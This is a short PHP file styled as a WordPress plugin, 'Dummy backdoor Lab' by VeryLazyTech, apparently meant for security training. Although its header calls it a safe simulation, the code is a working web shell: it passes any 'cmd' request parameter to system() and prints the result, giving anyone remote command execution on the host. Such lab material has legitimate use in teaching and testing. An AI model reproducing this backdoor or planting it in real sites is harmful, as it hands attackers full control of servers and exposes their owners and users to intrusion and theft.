<?php 
/*
Plugin Name: Dummy backdoor Lab by VeryLazyTech
Description: Safe simulation of backdoor ?cmd={command}
Version: 1.0
Author: VeryLazyTech
Author URI: https://verylazytech.com
License: MIT
*/

if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
